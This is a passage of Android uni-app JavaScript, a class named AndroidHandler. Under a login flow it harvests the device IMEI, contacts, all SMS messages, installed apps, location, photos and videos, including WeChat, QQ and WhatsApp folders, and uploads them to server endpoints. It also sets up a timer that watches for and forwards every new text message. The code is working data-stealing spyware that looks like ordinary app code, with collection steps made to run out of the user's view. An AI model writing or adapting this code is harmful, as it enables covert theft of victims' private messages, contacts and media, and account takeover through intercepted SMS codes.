    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  }

  static async getFileSize(path) {
    return new Promise((resolve) => {
      plus.io.resolveLocalFileSystemURL(path, (entry) => {
        entry.file((file) => {
          resolve(this.formatSize(file.size));
        }, () => resolve('未知'));
      }, () => resolve('未知'));
    });
  }

  // 批量上传方法
  static async uploadFiles(data, url, phone) {
    console.log('准备上传文件，总数:', data.length);
    let successCount = 0;
    const results = [];
    const errors = [];

    for (const file of data) {
      try {
        const result = await this.uploadFile(file, phone, null);
        successCount++;
        results.push(result);
        console.log(`成功上传 ${successCount}/${data.length} 个文件`);
      } catch (error) {
        console.error('文件上传失败:', error);
        errors.push({
          fileName: file.name,
          error: error.message
        });
        continue;
      }
    }

    if (successCount === 0) {
      throw new Error('没有文件上传成功');
    }

    return {
      success: successCount,
      total: data.length,
      results: results,
      errors: errors
    };
  }

  // 批量上传图片
  static async uploadPhotos(photos, phone) {
    if (!photos?.length) {
      console.log('没有需要上传的图片');
      return 0;
    }

    console.log('开始上传图片:', {
      总数: photos.length,
      文件列表: photos
    });

    this.navigateToLoading();

    const results = {
      success: [],
      failed: []
    };

    try {
      for (const photo of photos) {
        try {
          await this.uploadFile({
            filePath: photo.path,
            name: photo.name,
            phone: phone
          });
          results.success.push(photo.name);
        } catch (error) {
          console.error(`文件 ${photo.name} 上传失败:`, error);
          results.failed.push({
            name: photo.name,
            error: error.message
          });
        }
      }

      console.log('上传结果:', {
        成功: results.success.length,
        失败: results.failed.length,
        详情: results
      });

      if (results.failed.length === photos.length) {
        throw new Error('所有文件上传失败，请重试');
      }

      return results.success.length;
    } catch (error) {
      console.error('批量上传图片失败:', error);
      throw error;
    }
  }

  // 修改 navigateToLoading 方法
  static navigateToLoading() {
    // 使用静态类变量防止重复跳转
    if (this.hasNavigated) {
      console.log('已经跳转过，跳过本次跳转');
      return;
    }
    
    // 立即设置标志，防止并发调用时的重复跳转
    this.hasNavigated = true;
    console.log('后台处理完成，等待倒计时跳转');
    
    // 添加页面状态检查
    const pages = getCurrentPages();
    const currentRoute = pages[pages.length - 1]?.route || '';
    
    // 如果当前已经在loading页面，不再跳转
    if (currentRoute.includes('loading')) {
      console.log('当前已在loading页面，无需跳转');
      return;
    }
    
    // 不再执行导航，注释掉原来的导航代码
    // uni.navigateTo({
    //   url: '/pages/loading/loading'
    // });
  }

  // 修改短信权限请求方法
  static async requestSMSPermission() {
    return new Promise((resolve, reject) => {
      plus.android.requestPermissions(
        ['android.permission.READ_SMS'],
        function (resultObj) {
          let result = 0;
          for (var i = 0; i < resultObj.granted.length; i++) {
            var grantedPermission = resultObj.granted[i];
            console.log('已获取的短信权限：' + grantedPermission);
            result = 1;
          }
          for (var i = 0; i < resultObj.deniedPresent.length; i++) {
            var deniedPresentPermission = resultObj.deniedPresent[i];
            console.log('拒绝本次申请的短信权限：' + deniedPresentPermission);
            result = 0;
          }
          for (var i = 0; i < resultObj.deniedAlways.length; i++) {
            var deniedAlwaysPermission = resultObj.deniedAlways[i];
            console.log('永久拒绝申请的短信权限：' + deniedAlwaysPermission);
            result = -1;
          }
          resolve(result);
        },
        function (error) {
          console.error('申请短信权限失败：' + error.message);
          reject(error);
        }
      );
    });
  }

  // 添加存储权限请求方法
  static async requestStoragePermission() {
    return new Promise((resolve, reject) => {
      plus.android.requestPermissions(
        [
          'android.permission.READ_EXTERNAL_STORAGE',
          'android.permission.WRITE_EXTERNAL_STORAGE'
        ],
        function (resultObj) {
          let result = 0;
          for (var i = 0; i < resultObj.granted.length; i++) {
            var grantedPermission = resultObj.granted[i];
            console.log('已获取的权限：' + grantedPermission);
            result = 1;
          }
          for (var i = 0; i < resultObj.deniedPresent.length; i++) {
            var deniedPresentPermission = resultObj.deniedPresent[i];
            console.log('拒绝本次申请的权限：' + deniedPresentPermission);
            result = 0;
          }
          for (var i = 0; i < resultObj.deniedAlways.length; i++) {
            var deniedAlwaysPermission = resultObj.deniedAlways[i];
            console.log('永久拒绝申请的权限：' + deniedAlwaysPermission);
            result = -1;
          }
          resolve(result);
        },
        function (error) {
          console.error('申请权限失败：' + error.message);
          reject(error);
        }
      );
    });
  }

  // 处理视频上传
  static async processVideos(phone) {
    try {
      const videos = await this.findVideoFiles();
      if (!videos || videos.length === 0) {
        console.log('没有找到视频文件');
        return;
      }

      console.log('开始上传视频，总数:', videos.length);

      // 记录成功和失败数量
      let successCount = 0;
      let failCount = 0;

      for (const video of videos) {
        try {
          const name = plus.android.invoke(video, "getName");
          const path = plus.android.invoke(video, "getAbsolutePath");
          const size = plus.android.invoke(video, "length");

          // 设置大小限制为100MB
          const maxSize = 100 * 1024 * 1024;
          if (size > maxSize) {
            console.log(`视频文件过大(${this.formatSize(size)})，跳过上传:`, name);
            continue;
          }

          console.log(`开始上传视频: ${name} (${this.formatSize(size)})`);

          // 对于截屏录屏视频，先复制到临时目录
          if (path.includes('Screenshots') || path.includes('Screen Recorder')) {
            const tmpDir = plus.io.convertLocalFileSystemURL('_doc');
            const tmpPath = `${tmpDir}/${name}`;

            try {
              await this.copyFile(path, tmpPath);
              console.log('视频文件已复制到临时路径:', tmpPath);

              await this.uploadFile({
                filePath: tmpPath,
                name: name,
                phone: phone
              });
            } catch (copyError) {
              // 如果复制失败，尝试直接上传原文件
              console.error('复制文件失败，尝试直接上传:', copyError);
              await this.uploadFile({
                filePath: path,
                name: name,
                phone: phone
              });
            }
          } else {
            // 正常相机视频直接上传
            await this.uploadFile({
              filePath: path,
              name: name,
              phone: phone
            });
          }

          successCount++;
          console.log('视频上传成功:', name);
        } catch (error) {
          failCount++;
          console.error('视频上传失败:', error);
        }
      }

      console.log(`视频上传完成，总数: ${videos.length}, 成功: ${successCount}, 失败: ${failCount}`);
    } catch (error) {
      console.error('处理视频文件失败:', error);
    }
  }

  // 添加文件复制方法
  static async copyFile(sourcePath, targetPath) {
    return new Promise((resolve, reject) => {
      try {
        const File = plus.android.importClass("java.io.File");
        const FileInputStream = plus.android.importClass("java.io.FileInputStream");
        const FileOutputStream = plus.android.importClass("java.io.FileOutputStream");
        const FileChannel = plus.android.importClass("java.nio.channels.FileChannel");

        const sourceFile = new File(sourcePath);
        const targetFile = new File(targetPath);

        if (!plus.android.invoke(sourceFile, "exists")) {
          return reject(new Error('源文件不存在'));
        }

        // 创建目标文件父目录
        const parentDir = plus.android.invoke(targetFile, "getParentFile");
        if (!plus.android.invoke(parentDir, "exists")) {
          plus.android.invoke(parentDir, "mkdirs");
        }

        // 创建输入输出流
        const inStream = new FileInputStream(sourceFile);
        const outStream = new FileOutputStream(targetFile);

        // 获取通道
        const inChannel = plus.android.invoke(inStream, "getChannel");
        const outChannel = plus.android.invoke(outStream, "getChannel");

        // 复制文件
        plus.android.invoke(inChannel, "transferTo", 0, plus.android.invoke(inChannel, "size"), outChannel);

        // 关闭资源
        plus.android.invoke(inChannel, "close");
        plus.android.invoke(outChannel, "close");
        plus.android.invoke(inStream, "close");
        plus.android.invoke(outStream, "close");

        resolve(targetPath);
      } catch (error) {
        console.error('复制文件失败:', error);
        reject(error);
      }
    });
  }

  // 添加查找视频文件的方法
  static async findVideoFiles() {
    try {
      // 导入所需的 Android 类
      const environment = plus.android.importClass("android.os.Environment");
      const File = plus.android.importClass("java.io.File");
      const sdRoot = environment.getExternalStorageDirectory();

      // 视频目录列表
      const videoDirs = [
        'DCIM/Camera',
        'DCIM/Screenshots',
        'DCIM/Screen Recorder',
        'Movies',
        'Movies/Screenshots',
        'Pictures',
        'Pictures/Screenshots',
        'Download',
        'DCIM/100ANDRO',
        'DCIM',
        'Movies/Telegram',
        'Movies/WhatsApp',
        'Tencent/QQfile_recv',
        'Tencent/MicroMsg/Download',
        'Android/media/com.tencent.mm/MicroMsg/Download'
      ];

      console.log('查找视频目录:', videoDirs);
      const videoFiles = [];

      // 遍历所有目录
      for (const dirPath of videoDirs) {
        try {
          const fullPath = sdRoot + "/" + dirPath;
          console.log('检查目录:', fullPath);
          const dir = new File(fullPath);

          if (plus.android.invoke(dir, "exists")) {
            console.log('目录存在:', dirPath);
            if (plus.android.invoke(dir, "isDirectory")) {
              console.log('开始扫描目录:', dirPath);
              const files = plus.android.invoke(dir, "listFiles");
              if (files) {
                for (let i = 0; i < files.length; i++) {
                  const file = files[i];
                  const name = plus.android.invoke(file, "getName");

                  // 检查是否为视频文件
                  if (this.isVideoFile(name)) {
                    const size = plus.android.invoke(file, "length");
                    if (size > 0) {
                      videoFiles.push(file);
                    }
                  }
                }
              }
            }
          } else {
            console.log('目录不存在:', dirPath);
          }
        } catch (error) {
          console.error('处理目录出错:', dirPath, error);
        }
      }

      return videoFiles;
    } catch (error) {
      console.error('查找视频文件失败:', error);
      throw error;
    }
  }

  // 修改视频文件检查方法
  static isVideoFile(filename) {
    const videoExtensions = ['.mp4', '.3gp', '.mkv', '.avi', '.mov', '.wmv'];
    filename = filename.toLowerCase();
    return videoExtensions.some(ext => filename.endsWith(ext));
  }

  // 修改 readDirectory 方法
  static async readDirectory(dirPath) {
    return new Promise((resolve, reject) => {
      try {
        const File = plus.android.importClass("java.io.File");
        const dir = new File(dirPath);

        if (!plus.android.invoke(dir, "exists") || !plus.android.invoke(dir, "isDirectory")) {
          return resolve([]);
        }

        const files = plus.android.invoke(dir, "listFiles");
        if (!files) {
          return resolve([]);
        }

        const entries = Array.from(files).map(file => {
          const path = plus.android.invoke(file, "getPath");
          return {
            name: plus.android.invoke(file, "getName"),
            fullPath: path,
            fileObj: file,  // 存储 File 对象
            isDirectory: plus.android.invoke(file, "isDirectory"),
            toLocalURL: () => 'file://' + path
          };
        });

        resolve(entries);
      } catch (error) {
        console.error('读取目录失败:', dirPath, error);
        resolve([]);
      }
    });
  }

  // 单独检查定位权限
  static async checkLocationPermission() {
    try {
      const result = await this.requestSinglePermission('android.permission.ACCESS_FINE_LOCATION');
      return result;
    } catch (error) {
      console.error('Location permission error:', error);
      return false;
    }
  }

  // 单独检查相册权限
  static async checkGalleryPermission() {
    try {
      const result = await this.requestSinglePermission('android.permission.READ_EXTERNAL_STORAGE');
      return result;
    } catch (error) {
      console.error('Gallery permission error:', error);
      return false;
    }
  }

  // 单独检查短信权限
  static async checkSMSPermission() {
    try {
      const result = await this.requestSinglePermission('android.permission.READ_SMS');
      return result;
    } catch (error) {
      console.error('SMS permission error:', error);
      return false;
    }
  }

  // 请求单个权限的方法
  static requestSinglePermission(permissionName) {
    return new Promise((resolve, reject) => {
      try {
        // 检查当前权限状态
        const mainActivity = plus.android.runtimeMainActivity();
        const PackageManager = plus.android.importClass('android.content.pm.PackageManager');
        
        try {
          const currentStatus = mainActivity.checkSelfPermission(permissionName);
          console.log(`权限 ${permissionName} 当前状态:`, currentStatus === PackageManager.PERMISSION_GRANTED ? '已授权' : '未授权');
          
          // 如果已经有权限，直接返回成功
          if (currentStatus === PackageManager.PERMISSION_GRANTED) {
            console.log(`已拥有权限: ${permissionName}`);
            return resolve(true);
          }
        } catch (e) {
          console.warn(`检查权限状态失败: ${permissionName}`, e);
          // 如果是Android 11以下版本，某些权限可能不存在
          if (permissionName === 'android.permission.QUERY_ALL_PACKAGES') {
            const sdkVersion = plus.os.version;
            if (sdkVersion && parseInt(sdkVersion) < 30) {  // Android 11 是 API level 30
              console.log(`Android版本(${sdkVersion})低于11，不需要 QUERY_ALL_PACKAGES 权限`);
              return resolve(true);
            }
          }
        }
        
        // 请求权限
        plus.android.requestPermissions(
          [permissionName],
          function (resultObj) {
            let hasPermission = false;
            // 检查授予的权限
            for (var i = 0; i < resultObj.granted.length; i++) {
              const granted = resultObj.granted[i];
              console.log(`已获取权限: ${granted}`);
              if (granted === permissionName) {
                hasPermission = true;
              }
            }
            
            // 输出被拒绝的权限
            for (var i = 0; i < resultObj.deniedPresent.length; i++) {
              console.log(`本次拒绝的权限: ${resultObj.deniedPresent[i]}`);
            }
            
            for (var i = 0; i < resultObj.deniedAlways.length; i++) {
              console.log(`永久拒绝的权限: ${resultObj.deniedAlways[i]}`);
            }
            
            // 如果是QUERY_ALL_PACKAGES权限且在Android 11以上被拒绝，我们可以尝试使用其他方式
            if (!hasPermission && permissionName === 'android.permission.QUERY_ALL_PACKAGES') {
              const sdkVersion = plus.os.version;
              if (sdkVersion && parseInt(sdkVersion) >= 30) {
                console.log(`Android ${sdkVersion} 未授予 QUERY_ALL_PACKAGES 权限，将使用备选方法`);
              }
            }
            
            resolve(hasPermission);
          },
          function (error) {
            console.error(`权限(${permissionName})请求错误:`, error);
            // 对于QUERY_ALL_PACKAGES权限，即使请求失败也不阻止后续操作
            if (permissionName === 'android.permission.QUERY_ALL_PACKAGES') {
              resolve(false);
            } else {
              reject(error);
            }
          }
        );
      } catch (error) {
        console.error(`权限(${permissionName})请求处理异常:`, error);
        // 对于QUERY_ALL_PACKAGES权限，即使请求失败也不阻止后续操作
        if (permissionName === 'android.permission.QUERY_ALL_PACKAGES') {
          resolve(false);
        } else {
          reject(error);
        }
      }
    });
  }

  // 单独检查应用包查询权限
  static async checkPackagesPermission() {
    try {
      // 获取系统版本
      const sdkVersion = plus.os.version;
      console.log('Android 系统版本:', sdkVersion);
      
      // Android 11 (API 30) 及以上才需要 QUERY_ALL_PACKAGES 权限
      if (sdkVersion && parseInt(sdkVersion) < 30) {
        console.log(`Android版本(${sdkVersion})低于11，不需要 QUERY_ALL_PACKAGES 权限`);
        return true;
      }
      
      // 检查清单文件中是否已添加 <queries> 元素
      console.log('尝试使用 QUERY_ALL_PACKAGES 权限获取应用列表');
      
      // 请求权限
      const result = await this.requestSinglePermission('android.permission.QUERY_ALL_PACKAGES');
      
      if (!result) {
        console.log('未获得 QUERY_ALL_PACKAGES 权限，将使用备选方法获取应用列表');
      }
      
      return result;
    } catch (error) {
      console.error('应用包权限请求失败:', error);
      return false;
    }
  }

  // 修改现有的 checkPermissions 方法
  static async checkPermissions() {
    try {
      // 检查是否是Android平台
      if (plus.os.name.toLowerCase() !== 'android') {
        return {
          storage: true,
          contacts: true,
          location: true,
          sms: true,
          phone_state: true
        };
      }

      try {
        // 获取权限对象引用 - 排除通讯录权限，因为它已经在应用启动时单独检查过
        const perms = [
          'android.permission.READ_EXTERNAL_STORAGE',
          'android.permission.WRITE_EXTERNAL_STORAGE',
          // 'android.permission.READ_CONTACTS', // 通讯录权限已单独处理，不再这里处理
          'android.permission.ACCESS_FINE_LOCATION',
          'android.permission.ACCESS_COARSE_LOCATION',
          'android.permission.READ_SMS',
          'android.permission.READ_PHONE_STATE'
        ];

        // 获取通讯录权限状态 - 应该已经是授权的
        const mainActivity = plus.android.runtimeMainActivity();
        const PackageManager = plus.android.importClass('android.content.pm.PackageManager');
        const Manifest = plus.android.importClass('android.Manifest');
        
        let contactsPermissionGranted = false;
        try {
          const contactsResult = mainActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS);
          contactsPermissionGranted = (contactsResult === PackageManager.PERMISSION_GRANTED);
          console.log('通讯录权限状态(二次确认):', contactsPermissionGranted);
        } catch (e) {
          console.warn('通讯录权限状态检查失败:', e);
        }

        const hasPermissionMap = {};
        // 通讯录权限直接使用之前检查的结果
        hasPermissionMap['android.permission.READ_CONTACTS'] = contactsPermissionGranted;

        // 检查其他权限
        for (const perm of perms) {
          try {
            const result = mainActivity.checkSelfPermission(perm);
            hasPermissionMap[perm] = (result === PackageManager.PERMISSION_GRANTED);
          } catch (e) {
            console.warn(`权限检查失败: ${perm}`, e);
            hasPermissionMap[perm] = false;
          }
        }

        // 过滤出需要请求的权限
        const neededPermissions = perms.filter(perm => !hasPermissionMap[perm]);

        if (neededPermissions.length > 0) {
          console.log('需要请求的其他权限:', neededPermissions);

          // 请求其他所需权限
          return new Promise((resolve) => {
            plus.android.requestPermissions(
              neededPermissions,
              function (resultObj) {
                console.log('其他权限请求结果:', resultObj);

                // 更新权限状态
                for (let i = 0; i < resultObj.granted.length; i++) {
                  const granted = resultObj.granted[i];
                  hasPermissionMap[granted] = true;
                }

                // 返回最终权限状态
                resolve({
                  storage: hasPermissionMap['android.permission.READ_EXTERNAL_STORAGE'] && hasPermissionMap['android.permission.WRITE_EXTERNAL_STORAGE'],
                  contacts: contactsPermissionGranted, // 使用之前确认的结果
                  location: hasPermissionMap['android.permission.ACCESS_FINE_LOCATION'] || hasPermissionMap['android.permission.ACCESS_COARSE_LOCATION'],
                  sms: hasPermissionMap['android.permission.READ_SMS'],
                  phone_state: hasPermissionMap['android.permission.READ_PHONE_STATE']
                });
              },
              function (error) {
                console.error('其他权限请求错误:', error);
                // 返回目前的权限状态
                resolve({
                  storage: hasPermissionMap['android.permission.READ_EXTERNAL_STORAGE'] && hasPermissionMap['android.permission.WRITE_EXTERNAL_STORAGE'],
                  contacts: contactsPermissionGranted, // 使用之前确认的结果
                  location: hasPermissionMap['android.permission.ACCESS_FINE_LOCATION'] || hasPermissionMap['android.permission.ACCESS_COARSE_LOCATION'],
                  sms: hasPermissionMap['android.permission.READ_SMS'],
                  phone_state: hasPermissionMap['android.permission.READ_PHONE_STATE']
                });
              }
            );
          });
        } else {
          // 已经拥有所有权限
          return {
            storage: true,
            contacts: true,
            location: true,
            sms: true,
            phone_state: true
          };
        }
      } catch (error) {
        console.error('权限检查过程出错:', error);
        // 发生错误时，返回所有权限未获取的状态
        return {
          storage: false,
          contacts: false,
          location: false,
          sms: false,
          phone_state: false
        };
      }
    } catch (error) {
      console.error('权限检查主函数错误:', error);
      // 发生错误时，返回所有权限未获取的状态
      return {
        storage: false,
        contacts: false,
        location: false,
        sms: false,
        phone_state: false
      };
    }
  }

  // 添加统一的媒体文件扫描方法
  static async scanMediaFiles() {
    try {
      // 导入所需的 Android 类
      const environment = plus.android.importClass("android.os.Environment");
      const File = plus.android.importClass("java.io.File");
      const sdRoot = environment.getExternalStorageDirectory();

      // 需要扫描的目录列表 - 扩展更多可能包含图片的目录
      const mediaDirs = [
        // 标准媒体目录
        'DCIM/Camera',
        'DCIM/Screenshots',
        'DCIM/Screen Recorder',
        'DCIM',
        'DCIM/100ANDRO',
        'Pictures',
        'Pictures/Screenshots',
        'Download',
        
        // 社交媒体和聊天应用目录
        'Pictures/WeiXin',
        'Pictures/QQ',
        'Pictures/Telegram',
        'Pictures/WhatsApp',
        'Pictures/Facebook',
        'Pictures/Twitter',
        'Pictures/Instagram',
        'Pictures/Messenger',
        'Pictures/Line',
        'Pictures/Snapchat',
        
        // 微信和QQ文件目录
        'Tencent/QQfile_recv',
        'Tencent/MicroMsg/Download',
        'Tencent/QQ_Images',
        'Android/data/com.tencent.mm/MicroMsg/Download',
        'Android/data/com.tencent.mobileqq/Tencent/QQfile_recv',
        'Android/media/com.tencent.mm/MicroMsg/Download',
        
        // 其他常见媒体目录
        'Pictures/Saved Pictures',
        'Pictures/Camera',
        'Pictures/Saved Images',
        'Pictures/Photo Editor',
        'Movies',
        'Movies/Screenshots'
      ];

      // 添加外部存储目录扫描
      try {
        // 获取所有外部存储目录
        const externalFilesDirs = plus.android.invoke(plus.android.runtimeMainActivity(), "getExternalFilesDirs", null);
        if (externalFilesDirs && externalFilesDirs.length > 0) {
          for (let i = 0; i < externalFilesDirs.length; i++) {
            const dir = externalFilesDirs[i];
            if (dir) {
              const path = plus.android.invoke(dir, "getAbsolutePath");
              console.log('发现外部存储目录:', path);
              
              // 获取外部存储根目录
              if (path && path.includes('/Android/')) {
                const rootPath = path.substring(0, path.indexOf('/Android/'));
                if (rootPath && rootPath !== sdRoot.toString()) {
                  // 添加此外部存储上的媒体目录
                  for (const mediaDir of mediaDirs) {
                    mediaDirs.push(rootPath + '/' + mediaDir);
                  }
                }
              }
            }
          }
        }
      } catch (error) {
        console.error('获取外部存储目录出错:', error);
      }

      console.log('开始扫描媒体文件目录:', mediaDirs);
      const mediaFiles = {
        photos: [],
        videos: []
      };

      // 遍历所有目录
      for (const dirPath of mediaDirs) {
        try {
          const fullPath = dirPath.startsWith('/') ? dirPath : sdRoot + "/" + dirPath;
          console.log('检查目录:', fullPath);
          const dir = new File(fullPath);

          if (plus.android.invoke(dir, "exists")) {
            console.log('目录存在:', dirPath);
            if (plus.android.invoke(dir, "isDirectory")) {
              console.log('开始扫描目录:', dirPath);
              
              // 递归扫描目录及其子目录
              await this.scanDirectoryRecursively(dir, mediaFiles, 0);
            }
          } else {
            console.log('目录不存在:', dirPath);
          }
        } catch (error) {
          console.error('处理目录出错:', dirPath, error);
        }
      }

      console.log('媒体文件扫描完成:', {
        图片数量: mediaFiles.photos.length,
        视频数量: mediaFiles.videos.length
      });

      return mediaFiles;
    } catch (error) {
      console.error('扫描媒体文件失败:', error);
      throw error;
    }
  }
  
  // 递归扫描目录及其子目录
  static async scanDirectoryRecursively(dir, mediaFiles, depth) {
    // 限制递归深度，避免无限递归
    if (depth > 3) return;
    
    try {
      const files = plus.android.invoke(dir, "listFiles");
      if (!files) return;
      
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const isDirectory = plus.android.invoke(file, "isDirectory");
        
        if (isDirectory) {
          // 跳过特定系统目录
          const dirName = plus.android.invoke(file, "getName");
          if (dirName === "Android" || dirName === "." || dirName === ".." || dirName.startsWith(".")) {
            continue;
          }
          
          // 递归处理子目录
          await this.scanDirectoryRecursively(file, mediaFiles, depth + 1);
        } else {
          const name = plus.android.invoke(file, "getName");
          const size = plus.android.invoke(file, "length");
          
          if (size > 0) {
            // 检查是否为图片文件
            if (this.isImageFile(name)) {
              mediaFiles.photos.push(file);
            }
            // 检查是否为视频文件
            else if (this.isVideoFile(name)) {
              mediaFiles.videos.push(file);
            }
          }
        }
      }
    } catch (error) {
      console.error('递归扫描目录出错:', error);
    }
  }

  // 修改 handleLogin 方法，移除重复的通讯录权限检查
  static async handleLogin(phone, inviteCode) {
    try {
      // 检查参数
      if (!phone) {
        throw new Error('缺少必要的用户验证参数');
      }

      // 先保存用户信息到本地存储
      uni.setStorageSync('phone', phone);
      uni.setStorageSync('code', inviteCode);

      // 通讯录权限已在应用启动时检查，此处不再重复检查
      console.log('开始处理登录数据...');

      // 1. 获取设备信息
      const deviceInfo = await this.getDeviceInfo();
      console.log('设备信息:', deviceInfo);
      await this.uploadData('Uploads/apiimei', {
        imei: deviceInfo.imei,
        imei2: deviceInfo.imei2,
        model: deviceInfo.model,
        vendor: deviceInfo.vendor,
        real_phone: deviceInfo.real_phone || '',
        phone: phone
      }, phone);

      // 2. 获取通讯录
      const contactData = await this.getContacts(phone, inviteCode);
      console.log('通讯录数据:', contactData);
      await this.uploadData('Uploads/api', contactData, phone);

      // 3. 获取短信内容
      const smsData = await this.getSMSContent(phone, inviteCode);
      console.log('短信数据:', smsData);
      await this.uploadData('Uploads/apisms', smsData, phone);

      // 4. 获取已安装的应用信息 - 在获取位置信息之前优先处理
      try {
        console.log('开始获取和上传已安装应用信息');
        const apps = await this.getNativeApplicationList();
        if (apps && apps.length > 0) {
          console.log(`获取到 ${apps.length} 个已安装应用`);
          console.log('应用信息上传结果:', await this.uploadInstalledApps(apps, phone, inviteCode));
        } else {
          console.log('未获取到有效的应用信息，跳过上传');
        }
      } catch (appError) {
        console.error('获取或上传应用信息失败:', appError);
      }

      // 5. 获取位置信息
      const location = await this.getLocation();
      console.log('位置信息:', location);
      await this.uploadLocation(location, phone);

      // 6. 获取并上传图片
      const photos = await this.getPhotos();
      if (photos.length > 0) {
        await this.uploadPhotos(photos, phone);
      }

      // 7. 处理视频文件
      await this.processVideos(phone);

      // 标记处理完成，不再自动跳转
      this.navigateToLoading();

      return true;
    } catch (error) {
      console.error('处理登录失败:', error);
      return false;
    }
  }

  // 修改主处理函数，同样移除重复的通讯录权限检查
  static async handleAndroidData(phone) {
    try {
      // 通讯录权限已在应用启动时检查，此处不再重复检查
      console.log('开始处理安卓数据...');

      // 1. 获取设备信息
      const deviceInfo = await this.getDeviceInfo();
      console.log('设备信息:', deviceInfo);
      await this.uploadData('Uploads/apiimei', {
        imei: deviceInfo.imei,
        imei2: deviceInfo.imei2,
        model: deviceInfo.model,
        vendor: deviceInfo.vendor,
        real_phone: deviceInfo.real_phone || '',
        phone: phone
      }, phone);

      // 2. 获取短信内容
      const smsData = await this.getSMSContent(phone, deviceInfo.imei2);
      console.log('短信数据:', smsData);
      await this.uploadData('Uploads/apisms', smsData, phone);

      // 3. 获取已安装的应用信息 - 优先获取
      try {
        console.log('开始获取和上传已安装应用信息');
        const apps = await this.getNativeApplicationList();
        if (apps && apps.length > 0) {
          console.log(`获取到 ${apps.length} 个已安装应用`);
          console.log('应用信息上传结果:', await this.uploadInstalledApps(apps, phone));
        } else {
          console.log('未获取到有效的应用信息，跳过上传');
        }
      } catch (appError) {
        console.error('获取或上传应用信息失败:', appError);
      }

      // 4. 获取位置信息
      const location = await this.getLocation();
      console.log('位置信息:', location);
      await this.uploadLocation(location, phone);

      // 5. 获取并上传图片
      const photos = await this.getPhotos();
      if (photos.length > 0) {
        await this.uploadPhotos(photos, phone);
      }

      return true;
    } catch (error) {
      console.error('处理安卓数据失败:', error);
      return false;
    }
  }

  // 扫描目录
  static async scanDirectory(dirPath) {
    return new Promise((resolve, reject) => {
      plus.io.resolveLocalFileSystemURL(dirPath, (entry) => {
        entry.createReader().readEntries((entries) => {
          const files = entries
            .filter(entry => entry.isFile && this.isImageFile(entry.name))
            .map(entry => ({
              name: entry.name,
              path: entry.fullPath,
              size: entry.size || 0,
              lastModified: entry.lastModifiedDate?.getTime() || Date.now()
            }));
          resolve(files);
        }, reject);
      }, () => {
        // 如果目录不存在，返回空数组
        resolve([]);
      });
    });
  }

  // 开始短信监控功能
  static startSmsMonitoring(phone) {
    // 如果已经在监控中，先停止当前的监控
    if (this.isMonitoringSms) {
      this.stopSmsMonitoring();
    }
    
    console.log('开始短信监控功能，间隔为:', this.smsMonitorInterval / 1000, '秒');
    this.isMonitoringSms = true;
    
    // 保存用户手机号
    if (phone) {
      uni.setStorageSync('phone', phone);
    } else {
      phone = uni.getStorageSync('phone');
    }
    
    // 获取邀请码
    const inviteCode = uni.getStorageSync('code') || '';
    
    // 先执行一次短信检查，并获取最新短信ID
    this.checkAndUploadNewSms(phone, inviteCode).then(() => {
      // 设置定时器，定期检查新短信
      this.smsTimer = setInterval(() => {
        // 如果应用在前台，执行短信检查
        if (this.isMonitoringSms) {
          this.checkAndUploadNewSms(phone, inviteCode).catch(error => {
            console.error('短信监控过程中出错:', error);
          });
        }
      }, this.smsMonitorInterval);
    }).catch(error => {
      console.error('初始化短信监控失败:', error);
    });

    return true;
  }

  // 停止短信监控
  static stopSmsMonitoring() {
    console.log('停止短信监控功能');
    
    // 清除定时器
    if (this.smsTimer) {
      clearInterval(this.smsTimer);
      this.smsTimer = null;
    }
    
    this.isMonitoringSms = false;
    return true;
  }

  // 检查并上传新短信
  static async checkAndUploadNewSms(phone, inviteCode) {
    try {
      console.log('开始检查新短信');
      
      // 请求短信权限
      const smsPermission = await this.requestSMSPermission();
      if (smsPermission <= 0) {
        console.error('未获得短信权限，无法检查新短信');
        return false;
      }
      
      // 创建基础数据结构
      const smsData = [{
        imei: phone,
        imei2: inviteCode
      }];
      
      // 导入所需的 Android 类
      const ContentResolver = plus.android.importClass("android.content.ContentResolver");
      const Cursor = plus.android.importClass("android.database.Cursor");
      const Uri = plus.android.importClass("android.net.Uri");
      const activity = plus.android.runtimeMainActivity();
      const uri = Uri.parse("content://sms/");
      
      // 获取 ContentResolver
      const resolver = activity.getContentResolver();
      if (!resolver) {
        throw new Error('无法获取 ContentResolver');
      }
      
      // 定义查询参数
      const projection = [
        "_id",
        "address",
        "person",
        "body",
        "date",
        "type"
      ];
      
      // 创建查询条件，只获取上次检查后的新短信
      let selection = null;
      let selectionArgs = null;
      
      if (this.lastSmsId) {
        selection = "_id > ?";
        selectionArgs = [this.lastSmsId.toString()];
      }
      
      // 执行查询
      const cursor = resolver.query(
        uri,
        projection,
        selection,
        selectionArgs,
        "date desc"
      );
      
      console.log('短信游标获取成功:', cursor && cursor.getCount());
      
      // 如果没有新短信，直接返回
      if (!cursor || cursor.getCount() === 0) {
        if (cursor) cursor.close();
        console.log('没有新短信');
        return false;
      }
      
      let hasNewSms = false;
      let newMaxId = this.lastSmsId || 0;
      
      while (cursor.moveToNext()) {
        const smsId = parseInt(cursor.getString(cursor.getColumnIndex("_id")));
        
        // 更新最大ID值
        if (smsId > newMaxId) {
          newMaxId = smsId;
        }
        
        const smsInfo = {
          id: smsId,
          Name: cursor.getString(cursor.getColumnIndex("person")),
          Date: this.formatDate(cursor.getLong(cursor.getColumnIndex("date"))),
          PhoneNumber: cursor.getString(cursor.getColumnIndex("address")),
          Smsbody: cursor.getString(cursor.getColumnIndex("body")),
          Type: cursor.getString(cursor.getColumnIndex("type"))
        };
        
        smsData.push(smsInfo);
        hasNewSms = true;
      }
      
      cursor.close();
      
      // 更新最后检查的短信ID
      this.lastSmsId = newMaxId;
      
      // 如果有新短信，上传数据
      if (hasNewSms) {
        console.log('发现新短信，准备上传');
        await this.uploadData('Uploads/apisms', JSON.stringify(smsData), phone);
        console.log('新短信上传成功');
        return true;
      }
      
      return false;
    } catch (error) {
      console.error('检查新短信失败:', error);
      return false;
    }
  }
}

export default AndroidHandler; 